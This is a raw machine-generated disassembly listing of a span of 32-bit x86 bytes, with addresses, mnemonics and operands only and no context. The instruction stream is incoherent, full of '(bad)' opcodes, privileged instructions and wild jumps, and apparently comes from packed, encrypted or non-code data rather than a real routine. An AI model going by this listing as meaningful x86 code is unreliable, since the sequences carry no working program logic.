  426257:	or     DWORD PTR [eax],eax
  426259:	add    BYTE PTR [ecx+0x54],bl
  42625c:	mov    ebx,0x63d1bbf4
  426261:	enter  0x6a,0x0
  426265:	fdivr  DWORD PTR [ecx+0x4907a322]
  42626b:	add    ebp,esp
  42626d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42626e:	xchg   ebp,eax
  42626f:	das    
  426270:	dec    eax
  426271:	imul   eax,DWORD PTR [eax],0x0
  426274:	mov    bl,0xfc
  426276:	aad    0x5b
  426278:	inc    edx
  426279:	xchg   ebx,eax
  42627a:	mov    DWORD PTR [edi+0x49d3a9ff],0x58cbbba8
  426284:	pop    esi
  426285:	jne    0x4262b2
  426287:	paddusw mm3,mm0
  42628a:	mov    al,0xb7
  42628c:	xchg   ebx,eax
  42628d:	or     DWORD PTR [esi],eax
  42628f:	(bad)
  426293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426294:	sub    eax,0xbc4
  426299:	or     bh,BYTE PTR [ecx+0x14c042]
  42629f:	add    BYTE PTR [eax-0xbffffe5],cl
  4262a5:	adc    eax,0xae80176b
  4262aa:	add    BYTE PTR [eax],al
  4262ac:	stos   DWORD PTR es:[edi],eax
  4262ad:	pop    ss
  4262ae:	lds    eax,FWORD PTR [edx+ebp*1+0x382c0000]
  4262b5:	or     eax,0xf41b5e9f
  4262ba:	mov    ah,0x38
  4262bc:	push   esp
  4262bd:	fstp   TBYTE PTR [esi]
  4262bf:	push   ebp
  4262c0:	ins    BYTE PTR es:[edi],dx
  4262c1:	loop   0x426279
  4262c3:	popf   
  4262c4:	sbb    dh,ch
  4262c6:	(bad)  
  4262c7:	das    
  4262c8:	jo     0x426297
  4262ca:	ret    
  4262cb:	inc    ebp
  4262cc:	xor    esp,ebx
  4262ce:	repz jmp 0x42633e
  4262d1:	mov    ch,0xf1
  4262d3:	arpl   WORD PTR [esi-0x6e],si
  4262d6:	xchg   esi,eax
  4262d7:	jmp    0xf8017c96
  4262dc:	scas   al,BYTE PTR es:[edi]
  4262dd:	addr16 sub eax,0x94ead951
  4262e3:	scas   al,BYTE PTR es:[edi]
  4262e4:	rcl    al,cl
  4262e6:	pusha  
  4262e7:	outs   dx,DWORD PTR ds:[esi]
  4262e8:	lahf   
  4262e9:	mov    WORD PTR ss:[edx+0x50020000],?
  4262f0:	or     al,0x28
  4262f2:	add    BYTE PTR [eax],al
  4262f4:	dec    ecx
  4262f5:	rcr    BYTE PTR [esi+0x0],0x0
  4262f9:	add    esp,DWORD PTR [ebx-0x5e]
  4262fc:	or     eax,DWORD PTR [ebx-0x42]
  4262ff:	sub    eax,0x66669250
  426304:	bound  esp,QWORD PTR [ecx-0x28]
  426307:	imul   ebx,DWORD PTR [ebx-0x13],0xffffffbf
  42630b:	and    ecx,DWORD PTR [esi]
  42630d:	mov    BYTE PTR [esi],ch
  42630f:	add    BYTE PTR [eax],al
  426311:	xchg   edi,eax
  426312:	xchg   esp,eax
  426313:	loope  0x42637c
  426315:	or     bl,BYTE PTR [eax-0x5abf1c93]
  42631b:	add    BYTE PTR [eax],al
  42631d:	pop    edi
  42631e:	repnz mov bl,0x34
  426321:	mov    edi,0x3c4617d2
  426326:	cvttps2pi mm0,QWORD PTR [edx+0xb]
  42632a:	out    dx,eax
  42632b:	cmp    DWORD PTR [ecx-0x79c936fd],eax
  426331:	pop    ds
  426332:	out    dx,al
  426333:	fcom   DWORD PTR [esi+eiz*2]
  426336:	in     al,dx
  426337:	adc    al,0x5c
  426339:	dec    edi
  42633a:	stos   DWORD PTR es:[edi],eax
  42633b:	test   edi,ebx
  42633d:	mov    cl,BYTE PTR [ebp+0x26]
  426340:	jno    0x42632f
  426342:	jmp    0x42632b
  426344:	rcr    ebx,1
  426346:	loopne 0x42631a
  426348:	or     edi,DWORD PTR [edi+0x49e6d42]
  42634e:	out    dx,eax
  42634f:	add    BYTE PTR [eax],al
  426351:	outs   dx,DWORD PTR ds:[esi]
  426352:	push   eax
  426353:	and    ebp,DWORD PTR [edx+0x5110f4e4]
  426359:	rol    BYTE PTR [edx],cl
  42635b:	mov    eax,?
  42635d:	add    BYTE PTR [eax],al
  42635f:	dec    ebx
  426360:	int    0x44
  426362:	outs   dx,BYTE PTR ds:[esi]
  426363:	add    BYTE PTR [eax],al
  426365:	dec    edx
  426366:	imul   ebx,DWORD PTR [ebx+0x1e],0x8e08ec
  42636d:	add    ah,ch
  42636f:	dec    ebx
  426370:	stos   DWORD PTR es:[edi],eax
  426371:	inc    ecx
  426372:	scas   al,BYTE PTR es:[edi]
  426373:	or     dh,al
  426375:	add    BYTE PTR [eax],al
  426377:	rcl    dl,1
  426379:	adc    DWORD PTR [ecx-0x67],esp
  42637c:	cld    
  42637d:	cmp    BYTE PTR [ecx+0xa9c0],cl
  426383:	pusha  
  426384:	push   DWORD PTR [edx+0x576e830f]
  42638a:	jbe    0x426397
  42638c:	int3   
  42638d:	sub    eax,0xddb00000
  426392:	jg     0x42635d
  426394:	pop    esi
  426395:	jl     0x426323
  426397:	adc    BYTE PTR [eax],al
  426399:	add    BYTE PTR [ebx],bl
  42639b:	mov    eax,ds:0x7684e3
  4263a0:	add    BYTE PTR [edi*1+0x2ba6de73],ch
  4263a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263a8:	and    al,0x92
  4263aa:	mov    al,0x63
  4263ac:	out    0xd0,eax
  4263ae:	pushf  
  4263af:	and    eax,0xab9e387
  4263b4:	ds pop esi
  4263b6:	adc    eax,0x21786845
  4263bc:	imul   ebx,ebx,0x3c2dfdf6
  4263c2:	ret    
  4263c3:	and    al,0x26
  4263c5:	push   esi
  4263c6:	cmc    
  4263c7:	(bad)  [esi]
  4263c9:	test   eax,0x7291a955
  4263ce:	push   ecx
  4263cf:	xchg   esi,eax
  4263d0:	mov    ecx,0xbdb6dfca
  4263d5:	(bad)  
  4263d6:	daa    
  4263d7:	and    ebx,eax
  4263d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263da:	jne    0x426407
  4263dc:	pop    eax
  4263dd:	sti    
  4263de:	out    dx,eax
  4263df:	cwde   
  4263e0:	loope  0x426450
  4263e2:	add    ecx,DWORD PTR es:[ebx]
  4263e5:	cmp    eax,0x769cb4f
  4263ea:	fldenv [edx+0x2d]
  4263ed:	mov    ds:0x8a4c82a0,eax
  4263f2:	add    BYTE PTR [eax],al
  4263f4:	mov    esp,DWORD PTR [ecx]
  4263f6:	dec    edx
  4263f7:	push   edi
  4263f8:	push   ebx
  4263f9:	jae    0x73394a0
  4263ff:	xchg   ebp,eax
  426400:	in     al,dx
  426401:	leave  
  426402:	fwait
  426403:	cmp    ah,bl
  426405:	mov    edx,0xb6bb9045
  42640a:	inc    ebp
  42640b:	in     eax,0x86
  42640d:	fwait
  42640e:	std    
  42640f:	aaa    
  426410:	ss iret 
  426412:	push   0x4
  426414:	mov    ebx,0x961e0000
  426419:	cmp    esp,DWORD PTR ds:0x3b572d4
  42641f:	or     DWORD PTR [ecx],0xffffffdf
  426422:	mov    al,ds:0xb188ef2e
  426427:	add    BYTE PTR [eax],al
  426429:	cmp    edx,DWORD PTR [esi+0x64]
  42642c:	mov    esp,0x547b0546
  426431:	xor    eax,0x646116f
  426436:	int    0x42
  426438:	fwait
  426439:	ds push edx
  42643b:	mov    dl,0xc4
  42643d:	cli    
  42643e:	add    BYTE PTR [eax],al
  426440:	jmp    0x32d9b8fc
  426445:	inc    eax
  426446:	add    DWORD PTR [eax],0xe7edf500
  42644c:	or     DWORD PTR [edx],esi
  42644e:	push   ecx
  42644f:	jb     0x4264ae
  426451:	das    
  426452:	mov    ebx,0xefbb54f8
  426457:	popa   
  426458:	in     al,0x6d
  42645a:	xchg   ebp,eax
  42645b:	push   edi
  42645c:	ja     0x426422
  42645e:	int3   
  42645f:	add    BYTE PTR [eax],al
  426461:	inc    ebx
  426462:	ret    
  426463:	and    BYTE PTR [ebx+ebp*4+0x3b643fbc],bh
  42646a:	xor    cl,ah
  42646c:	sub    eax,0xfce30000
  426471:	clc    
  426472:	ds xor al,0x6b
  426475:	cmp    al,0x7b
  426477:	cmp    dl,BYTE PTR ds:0xb0a4ba81
  42647d:	mov    ah,0xd
  42647f:	bound  esi,QWORD PTR [eax+0x78ef2dc5]
  426485:	lods   al,BYTE PTR ds:[esi]
  426486:	mov    ebp,edi
  426488:	push   ecx
  426489:	mul    al
  42648b:	mov    ds:0xf66717d5,al
  426490:	cs leave 
  426492:	mov    dl,0xca
  426494:	add    BYTE PTR [eax+0x0],bh
  426497:	add    al,bh
  426499:	inc    eax
  42649a:	into   
  42649b:	add    BYTE PTR [eax],al
  42649d:	inc    edi
  42649e:	adc    BYTE PTR [edx],dh
  4264a0:	mov    si,0x8aaa
  4264a4:	inc    eax
  4264a5:	pop    ss
  4264a6:	add    BYTE PTR [eax],al
  4264a8:	test   BYTE PTR ds:0x16710000,al
  4264ae:	js     0x42647f
  4264b0:	mul    BYTE PTR [ecx+0x3f]
  4264b3:	xor    al,0x29
  4264b5:	xchg   ebx,eax
  4264b6:	xchg   esp,eax
  4264b7:	es jbe 0x426509
  4264ba:	jmp    0x42650a
  4264bc:	and    dh,dh
  4264be:	mov    ah,0x3c
  4264c0:	sbb    DWORD PTR [edx+0x511105fa],eax
  4264c6:	xlat   BYTE PTR ds:[ebx]
  4264c7:	mov    eax,0xb7b296f5
  4264cc:	jae    0x426510
  4264ce:	aad    0xde
  4264d0:	scas   al,BYTE PTR es:[edi]
  4264d1:	push   edx
  4264d2:	push   ds
  4264d3:	adc    eax,0x6f8d53d6
  4264d8:	aad    0x31
  4264da:	adc    edx,DWORD PTR [esi+0x6b9f4ed3]
  4264e0:	fisttp QWORD PTR [ecx+0x66e74e5e]
  4264e6:	lods   eax,DWORD PTR ds:[esi]
  4264e7:	and    al,0x78
  4264e9:	das    
  4264ea:	stos   DWORD PTR es:[edi],eax
  4264eb:	xor    BYTE PTR [ebp+0x7f0c1e],al
  4264f1:	add    al,ch
  4264f3:	test   BYTE PTR [edx-0x14d10000],dh
  4264f9:	iret   
  4264fa:	jae    0x42653f
  4264fc:	pusha  
  4264fd:	sbb    BYTE PTR [edi+0x32cc],ch
  426503:	ss add esi,ecx
  426506:	outs   dx,DWORD PTR ds:[esi]
  426507:	inc    dh
  426509:	aam    0xa2
  42650b:	cmp    al,BYTE PTR ds:0x33acceff
  426511:	or     eax,esi
  426513:	adc    DWORD PTR ds:0x8fd1cd01,0x6f
  42651a:	xor    eax,0xdc81762a
  42651f:	lods   eax,DWORD PTR ds:[esi]
  426520:	xor    ebx,DWORD PTR [edx+0x49]
  426523:	add    al,0x47
  426525:	add    BYTE PTR [eax],al
  426527:	push   es
  426528:	cmp    al,0xd4
  42652a:	jbe    0x426598
  42652c:	sbb    eax,DWORD PTR [ecx-0x226ac8ee]
  426532:	nop
  426533:	std    
  426534:	add    BYTE PTR [ebx-0x2ae80000],0xd9
  42653b:	dec    eax
  42653c:	pop    esi
  42653d:	add    BYTE PTR [eax],al
  42653f:	cmp    eax,0x18b07051
  426544:	pop    esi
  426545:	and    DWORD PTR [edx],eax
  426547:	mov    ds:0x94f9f1c3,al
  42654c:	jp     0x426516
  42654e:	lods   al,BYTE PTR ds:[esi]
  42654f:	add    BYTE PTR [eax],al
  426551:	pop    eax
  426552:	lods   al,BYTE PTR ds:[esi]
  426553:	jmp    0xbad6f703
  426558:	ret    
  426559:	icebp  
  42655a:	arpl   WORD PTR [eax],bx
  42655c:	fs cld 
  42655e:	jp     0x426521
  426560:	mov    ch,0xff
  426562:	jno    0x42658f
  426564:	push   ebp
  426565:	das    
  426566:	cdq    
  426567:	(bad)  
  426568:	pop    eax
  426569:	cmc    
  42656a:	and    al,0x2f
  42656c:	das    
  42656d:	faddp  st(6),st
  42656f:	hlt    
  426570:	test   eax,0x1a18ca55
  426575:	je     0x42656a
  426577:	out    dx,al
  426578:	mov    esp,0x9f08595d
  42657d:	add    BYTE PTR [eax],al
  42657f:	cmp    ebx,ecx
  426581:	loope  0x4265e1
  426583:	push   0x1
  426585:	inc    BYTE PTR [edi+0x4f87b695]
  42658b:	xchg   ebx,eax
  42658c:	je     0x4265d1
  42658e:	dec    ecx
  42658f:	je     0x4265f4
  426591:	getsec 
  426593:	arpl   WORD PTR [ecx+0x68],bx
  426596:	dec    ebx
  426597:	xor    BYTE PTR [esi-0x11],dh
  42659a:	das    
  42659b:	pop    ebx
  42659c:	cmp    al,0x53
  42659e:	nop
  42659f:	mov    ah,0xb2
  4265a1:	push   eax
  4265a2:	inc    ebx
  4265a3:	(bad)  
  4265a4:	sti    
  4265a5:	mov    ch,0xc
  4265a7:	xchg   ebp,eax
  4265a8:	add    BYTE PTR [eax],al
  4265aa:	int    0xb5
  4265ac:	jge    0x426583
  4265ae:	and    al,0x1b
  4265b0:	popa   
  4265b1:	sbb    al,0x30
  4265b3:	fsub   DWORD PTR ds:0x28d221b5
  4265b9:	dec    esp
  4265ba:	sbb    al,BYTE PTR [eax]
  4265bc:	add    ah,bh
  4265be:	retf   0xf9d8
  4265c1:	dec    esi
  4265c2:	(bad)  
  4265c3:	push   edx
  4265c4:	pop    ss
  4265c5:	js     0x426599
  4265c7:	jmp    0xeeecb8e5
  4265cc:	and    al,0x4f
  4265ce:	mov    ds:0xf9aa2051,eax
  4265d3:	mov    al,ds:0x7f245952
  4265d8:	aad    0x7e
  4265da:	jecxz  0x426590
  4265dc:	inc    ecx
  4265dd:	adc    eax,DWORD PTR [edi+0xb68bd89]
  4265e3:	push   ebx
  4265e4:	ja     0x4265ef
  4265e6:	inc    ebx
  4265e7:	push   esi
  4265e8:	xor    ecx,DWORD PTR [edi-0x4d098cc6]
  4265ee:	xor    bl,bh
  4265f0:	leave  
  4265f1:	fidiv  WORD PTR [edi]
  4265f3:	mov    ebx,0xf602db28
  4265f8:	adc    al,0xa0
  4265fa:	xchg   ecx,eax
  4265fb:	scas   eax,DWORD PTR es:[edi]
  4265fc:	dec    eax
  4265fd:	imul   eax,DWORD PTR [eax],0x0
  426600:	dec    esp
  426601:	sahf   
  426602:	add    BYTE PTR [eax],al
  426604:	jecxz  0x426683
  426606:	clc    
  426607:	and    eax,DWORD PTR [eax]
  426609:	data16 add BYTE PTR [eax],al
  42660c:	cmp    BYTE PTR [esi],al
  42660e:	xchg   ebp,eax
  42660f:	jns    0x4265a1
  426611:	pop    edi
  426612:	xchg   esi,eax
  426613:	iret   
  426614:	dec    ebp
  426615:	popf   
  426616:	(bad)  
  426617:	cs fwait
  426619:	out    0xd3,eax
  42661b:	cld    
  42661c:	mov    DWORD PTR [edx],ecx
  42661e:	popa   
  42661f:	mov    edi,DWORD PTR [eax]
  426621:	aad    0x8e
  426623:	iret   
  426624:	test   esp,0x610000b4
  42662a:	inc    ebx
  42662b:	jb     0x42667e
  42662d:	inc    ebp
  42662e:	fsub   DWORD PTR [eax+0x7a562a64]
  426634:	mov    dl,0xc5
  426636:	out    0x29,al
  426638:	es xor eax,0x4808
  42663e:	cmp    eax,DWORD PTR [ecx+0x36]
  426641:	inc    esi
  426642:	and    al,0x13
  426644:	dec    esi
  426645:	xor    edx,ebx
  426647:	or     DWORD PTR [ebx+0x4f],edi
  42664a:	out    0x67,eax
  42664c:	push   ebp
  42664d:	xor    edi,eax
  42664f:	ret    
  426650:	in     eax,dx
  426651:	pop    ecx
  426652:	cmp    dl,ah
  426654:	jmp    0x42669c
  426656:	cmp    DWORD PTR [ecx+ecx*2-0x30280000],ecx
  42665d:	add    BYTE PTR [esi+0x0],bh
  426660:	add    bl,al
  426662:	mov    eax,0x3c37645f
  426667:	dec    ebp
  426668:	push   ss
  426669:	mov    bl,0x52
  42666b:	cdq    
  42666c:	out    0x29,eax
  42666e:	cdq    
  42666f:	jp     0x4265ff
  426671:	cmp    BYTE PTR [ecx],dl
  426673:	cld    
  426674:	sbb    BYTE PTR [ebx-0x446bf8a5],dh
  42667a:	mov    esp,0x805a2fd8
  42667f:	sub    eax,DWORD PTR [eax]
  426681:	add    BYTE PTR [ebp-0x7838129],cl
  426687:	aam    0xeb
  426689:	lahf   
  42668a:	xor    esi,DWORD PTR [edi+0x1b16ceea]
  426690:	sub    cl,BYTE PTR [esi]
  426692:	aam    0x5d
  426694:	dec    edi
  426695:	loopne 0x42665c
  426697:	test   DWORD PTR [edi+0x36fe7099],ebx
  42669d:	(bad)  
  42669e:	push   ss
  42669f:	mov    ebx,DWORD PTR [esp+ebp*4+0xe848a6]
  4266a6:	add    BYTE PTR [ebx+0x704d232c],dl
  4266ac:	xchg   esi,eax
  4266ad:	das    
  4266ae:	test   DWORD PTR [esi+0x53],esi
  4266b1:	mov    ds:0xe580c3,eax
  4266b7:	add    BYTE PTR [edx-0x7f3acb56],dh
  4266bd:	mov    bh,0x0
  4266bf:	add    BYTE PTR [ebx+0x43910674],cl
  4266c5:	fnsave [ecx]
  4266c7:	adc    DWORD PTR [ebx+0x1f2bf67f],ebp
  4266cd:	pop    es
  4266ce:	pop    ebp
  4266cf:	into   
  4266d0:	test   DWORD PTR [esp+ebp*4+0x3a],esi
  4266d4:	push   ds
  4266d5:	mov    dl,0xaa
  4266d7:	push   ebp
  4266d8:	enter  0x9c,0x0
  4266dc:	das    
  4266dd:	or     ch,bl
  4266df:	add    BYTE PTR [eax],al
  4266e1:	xor    BYTE PTR [esi+0x54],bh
  4266e4:	mov    al,ds:0x4f033096
  4266e9:	(bad)  
  4266ea:	aas    
  4266eb:	imul   ecx,DWORD PTR [edi+0x6d],0xcc495068
  4266f2:	add    BYTE PTR [eax],al
  4266f4:	add    BYTE PTR [edi-0x66],dl
  4266f7:	jmp    0x34b2:0x4da61f77
  4266fe:	mov    bl,0x56
  426700:	loope  0x42668e
  426702:	add    BYTE PTR [eax],al
  426704:	add    BYTE PTR ds:0x45b43f3,al
  42670a:	ins    BYTE PTR es:[edi],dx
  42670b:	add    BYTE PTR [eax],al
  42670d:	scas   eax,DWORD PTR es:[edi]
  42670e:	push   ds
  42670f:	test   al,0x68
  426711:	cmp    DWORD PTR [edi-0x52],0x6d
  426715:	dec    edi
  426716:	dec    edx
  426717:	sti    
  426718:	push   esi
  426719:	pusha  
  42671a:	lea    edi,[ecx+0x2e]
  42671d:	jae    0x4266f3
  42671f:	out    0xe2,al
  426721:	lock pop eax
  426723:	add    ecx,DWORD PTR [ebp-0x39]
  426726:	or     eax,0x21bd07ac
  42672b:	xor    al,BYTE PTR [ebx]
  42672d:	lock daa 
  42672f:	adc    eax,0xcb426df3
  426734:	mov    dh,0x1b
  426736:	mov    dl,0xa5
  426738:	mov    bh,0x1f
  42673a:	ret    0x3875
  42673d:	add    eax,0xf9d9df9a
  426742:	sbb    al,ah
  426744:	std    
  426745:	add    BYTE PTR [eax],al
  426747:	mov    ebp,0x28d21b3b
  42674c:	inc    edx
  42674d:	cdq    
  42674e:	(bad)  
  42674f:	jl     0x42679d
  426751:	ret    
  426752:	add    BYTE PTR [eax],al
  426754:	lds    esp,FWORD PTR [edx+0x3afa1e6a]
  42675a:	rol    BYTE PTR [esi],1
  42675c:	push   edx
  42675d:	add    eax,0x6046e73f
  426762:	in     eax,0x25
  426764:	pop    ss
  426765:	enter  0x50,0x0
  426769:	cmp    esi,esi
  42676b:	and    edx,DWORD PTR [edi-0x3c]
  42676e:	mov    dh,0x0
  426770:	add    BYTE PTR [ecx+eax*1+0x0],al
  426774:	add    cl,dl
  426776:	imul   edx,DWORD PTR [ebx-0x3f],0x41
  42677a:	push   eax
  42677b:	loope  0x42672c
  42677d:	adc    al,0x47
  42677f:	pusha  
  426780:	sahf   
  426781:	in     al,dx
  426782:	sbb    DWORD PTR [ebp+0x60],edi
  426785:	arpl   WORD PTR [edi+0x3],di
  426788:	jb     0x4267c4
  42678a:	das    
  42678b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42678c:	aaa    
  42678d:	sub    BYTE PTR [ebx],al
  42678f:	inc    ecx
  426790:	loopne 0x4267ea
  426792:	add    DWORD PTR [esi-0x467a067d],ebx
  426798:	in     eax,0xb2
  42679a:	pop    esi
  42679b:	cmp    dh,cl
  42679d:	mov    bl,0x47
  42679f:	sub    DWORD PTR [esi+0x1ee2b41e],0x20913a1f
  4267a9:	ds cs push esi
  4267ac:	add    BYTE PTR [esi+0x0],dh
  4267af:	add    BYTE PTR [eax],al
  4267b1:	out    0x0,eax
  4267b3:	add    dl,dl
  4267b5:	jb     0x42674d
  4267b7:	xchg   ecx,eax
  4267b8:	sbb    DWORD PTR [eax-0x62],edx
  4267bb:	add    ebx,DWORD PTR [esi+0x19]
  4267be:	sub    cl,ch
  4267c0:	dec    ecx
  4267c1:	aaa    
  4267c2:	pop    eax
  4267c3:	inc    ecx
  4267c4:	ror    bl,1
  4267c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267c7:	scas   eax,DWORD PTR es:[edi]
  4267c8:	addr16 push 0xffffffd3
  4267cb:	call   FWORD PTR [ebx]
  4267cd:	fimul  WORD PTR [ebp-0xb940689]
  4267d3:	push   0x78
  4267d5:	int3   
  4267d6:	test   DWORD PTR [eax],0x600400
  4267dc:	add    ch,al
  4267de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267df:	repz sbb al,0xda
  4267e2:	inc    ecx
  4267e3:	inc    esi
  4267e4:	in     al,0x1f
  4267e6:	sub    eax,0xf68a850d
  4267eb:	adc    esp,DWORD PTR [edx-0x5c59b45b]
  4267f1:	test   eax,0x4510c225
  4267f6:	or     BYTE PTR [ebx+0x0],dl
  4267f9:	add    BYTE PTR [edx+0xcc88],ah
  4267ff:	aaa    
  426800:	sub    al,0xb4
  426802:	inc    ebx
  426803:	mov    edi,0x9e1a47df
  426809:	push   cs
  42680a:	adc    DWORD PTR [eax+eiz*4],edx
  42680d:	xchg   edi,eax
  42680e:	pop    edx
  42680f:	(bad)  
  426810:	out    0xc3,al
  426812:	push   edi
  426813:	dec    ecx
  426814:	daa    
  426815:	fistp  QWORD PTR [edi]
  426817:	xchg   esi,eax
  426818:	pop    ds
  426819:	sub    DWORD PTR [ecx+0xf7849d],0x0
  426820:	ja     0x4267de
  426822:	imul   bh
  426824:	pop    ds
  426825:	int    0x9e
  426827:	xchg   edx,eax
  426828:	pop    ss
  426829:	retf   
  42682a:	mov    cl,0x2f
  42682c:	jae    0x426815
  42682e:	mov    edi,0x6dc4ffbe
  426833:	add    BYTE PTR [eax],al
  426835:	pop    eax
  426836:	ins    BYTE PTR es:[edi],dx
  426837:	sbb    DWORD PTR [ecx-0x2243b50d],0xa4687110
  426841:	int    0xf4
  426843:	iret   
  426844:	fisub  WORD PTR [ecx]
  426846:	jmp    0x3699:0x58c7efd1
  42684d:	inc    eax
  42684e:	nop
  42684f:	add    BYTE PTR [eax],al
  426851:	aaa    
  426852:	fs mov ebx,0x14072e03
  426858:	jp     0x426832
  42685a:	or     edx,DWORD PTR [edx]
  42685c:	sbb    al,0x9e
  42685e:	mov    esp,0x13216c16
  426863:	mov    WORD PTR [ebx-0x5f80000],es
  426869:	add    BYTE PTR [eax],al
  42686b:	xor    eax,0x6dfc2b61
  426870:	adc    DWORD PTR [eiz*4-0x18df8470],0x44
  426878:	scas   eax,DWORD PTR es:[edi]
  426879:	add    BYTE PTR [eax],al
  42687b:	cdq    
  42687c:	sub    eax,0xa648
  426881:	loope  0x42685d
  426883:	pop    edi
  426884:	mov    bl,0x7e
  426886:	scas   eax,DWORD PTR es:[edi]
  426887:	push   es
  426888:	jno    0x4268d8
  42688a:	shr    ah,cl
  42688c:	aaa    
  42688d:	push   cs
  42688e:	ins    DWORD PTR es:[edi],dx
  42688f:	pushf  
  426890:	dec    esi
  426891:	push   ss
  426892:	clc    
  426893:	mov    ds:0xaa33b3e7,eax
  426898:	aaa    
  426899:	mov    bl,0x22
  42689b:	fsub   st(6),st
  42689d:	aaa    
  42689e:	mov    dl,0x15
  4268a0:	stos   DWORD PTR es:[edi],eax
  4268a1:	push   0x2b
  4268a3:	(bad)  
  4268a4:	fdiv   DWORD PTR [esi]
  4268a6:	and    DWORD PTR [ebx-0x34],0x1200000d
  4268ad:	(bad)  [esi+ebx*8-0x398e5266]
  4268b4:	mov    WORD PTR [edi],fs
  4268b6:	add    BYTE PTR [eax],al
  4268b8:	das    
  4268b9:	mov    edx,DWORD PTR [esi-0x30b1c762]
  4268bf:	pop    ebp
  4268c0:	push   esp
  4268c1:	jmp    0x1a2c:0x4160779b
  4268c8:	sahf   
  4268c9:	test   DWORD PTR [ecx-0x4adf22ff],0x7adb7164
  4268d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268d4:	mov    ch,0xd8
  4268d6:	nop
  4268d7:	push   ebp
  4268d8:	pop    ebx
  4268d9:	xchg   esp,eax
  4268da:	out    dx,eax
  4268db:	test   eax,0x9a75c509
  4268e0:	(bad)  
  4268e1:	out    dx,eax
  4268e2:	iret   
  4268e3:	add    edx,DWORD PTR [eax]
  4268e5:	loopne 0x42688c
  4268e7:	outs   dx,DWORD PTR ds:[esi]
  4268e8:	ret    0x8c2b
  4268eb:	add    BYTE PTR [eax],0x0
  4268ee:	fnstcw WORD PTR [ebp+0x77126735]
  4268f4:	sysret 
  4268f6:	nop
  4268f7:	and    ch,BYTE PTR [esi-0xe]
  4268fa:	jae    0x4268ed
  4268fc:	fwait
  4268fd:	sub    al,0x21
  4268ff:	dec    ecx
  426900:	js     0x426882
  426902:	out    0x0,al
  426904:	add    BYTE PTR [esi],al
  426906:	mov    ds:0x24c0d8,eax
  42690b:	add    BYTE PTR [edi+0x49],cl
  42690e:	pusha  
  42690f:	int3   
  426910:	cmp    BYTE PTR [eax],al
  426912:	add    dl,bl
  426914:	(bad)  
  426915:	pop    ds
  426916:	clc    
  426917:	cmp    eax,0xbd09d0e1
  42691c:	dec    edx
  42691d:	repnz (bad) 
  426920:	cs out 0xb9,eax
  426923:	xchg   esi,eax
  426924:	adc    DWORD PTR ds:0x4aa3acbb,ebx
  42692a:	rcr    edx,1
  42692c:	inc    ecx
  42692d:	out    0x4a,eax
  42692f:	retf   
  426930:	fs push ebp
  426932:	add    edi,edi
  426934:	inc    edi
  426935:	push   ss
  426936:	push   cs
  426937:	sub    DWORD PTR [edi+eiz*2+0x8],ebx
  42693b:	jmp    0x1bac6940
  426940:	add    DWORD PTR [edx+0x3e005e],edx
  426946:	add    BYTE PTR [edx+0x36],ch
  426949:	mov    bh,0xac
  42694b:	hlt    
  42694c:	mov    ebp,0xb7c058
  426951:	add    BYTE PTR [edi],ah
  426953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426954:	jge    0x426923
  426956:	inc    esi
  426957:	lock int 0x54
  42695a:	mov    ds:0x73e279d8,eax
  42695f:	or     ecx,edx
  426961:	or     al,0x62
  426963:	add    BYTE PTR [eax],al
  426965:	xchg   ebp,eax
  426966:	in     eax,dx
  426967:	arpl   WORD PTR [ebp+0x3],sp
  42696a:	mov    ch,0x53
  42696c:	add    al,0xbb
  42696e:	add    BYTE PTR [eax],al
  426970:	jmp    0x334f:0xefd7bd4a
  426977:	mov    ebp,ecx
  426979:	or     al,0x48
  42697b:	add    BYTE PTR [eax],al
  42697d:	mov    bl,0x1d
  42697f:	xor    dl,al
  426981:	and    ebp,DWORD PTR [edx+0x9f36bc3]
  426987:	mov    BYTE PTR es:[ebx-0x6d670000],ah
  42698e:	cmp    eax,0xbc368791
  426993:	clc    
  426994:	ret    
  426995:	jne    0x4269c1
  426997:	jg     0x426927
  426999:	outs   dx,BYTE PTR ds:[esi]
  42699a:	ins    DWORD PTR es:[edi],dx
  42699b:	mov    cl,0x85
  42699d:	inc    eax
  42699e:	xchg   BYTE PTR [eax],al
  4269a0:	add    BYTE PTR [ebp+edi*2-0x2d],ah
  4269a4:	push   esi
  4269a5:	sub    bl,BYTE PTR [edi+0x69096406]
  4269ab:	mov    dh,0xb3
  4269ad:	inc    ebx
  4269ae:	sub    al,0x68
  4269b0:	nop
  4269b1:	scas   eax,DWORD PTR es:[edi]
  4269b2:	(bad)  
  4269b3:	icebp  
  4269b4:	add    BYTE PTR [eax],al
  4269b6:	repz and al,BYTE PTR [edx-0x38]
  4269ba:	xchg   ebx,eax
  4269bb:	add    BYTE PTR [eax],al
  4269bd:	adc    eax,0xf3a36b7
  4269c2:	mov    edi,0xb8a845a2
  4269c7:	xchg   DWORD PTR [esi*4-0x5ea5b901],edx
  4269ce:	jb     0x426a4e
  4269d0:	aad    0x29
  4269d2:	and    ebx,DWORD PTR [edi-0x6bd5dbe2]
  4269d8:	ss hlt 
  4269da:	mov    ah,0xc6
  4269dc:	sub    al,0x2d
  4269de:	push   0x7776ce4
  4269e3:	add    eax,0xa8bbb14b
  4269e8:	es div ebx
  4269eb:	loope  0x42697d
  4269ed:	pop    edi
  4269ee:	push   es
  4269ef:	inc    edx
  4269f0:	jb     0x426a3e
  4269f2:	mov    ah,0x0
  4269f4:	add    BYTE PTR [edi],bh
  4269f6:	sub    al,0xcf
  4269f8:	sub    eax,0x6b11285d
  4269fd:	mov    cl,0xf9
  4269ff:	mov    ds:0x99c002,al
  426a04:	add    BYTE PTR [esi],dh
  426a06:	sbb    al,0x65
  426a08:	hlt    
  426a09:	cld    
  426a0a:	fimul  DWORD PTR [edi]
  426a0c:	inc    esi
  426a0d:	dec    esi
  426a0e:	das    
  426a0f:	jno    0x426a66
  426a11:	(bad)  
  426a12:	cli    
  426a13:	sub    eax,0xbd65ff15
  426a18:	xlat   BYTE PTR ds:[ebx]
  426a19:	clc    
  426a1a:	in     eax,0x84
  426a1c:	inc    ebp
  426a1d:	add    BYTE PTR [eax],al
  426a1f:	mov    ebp,0x35485a4f
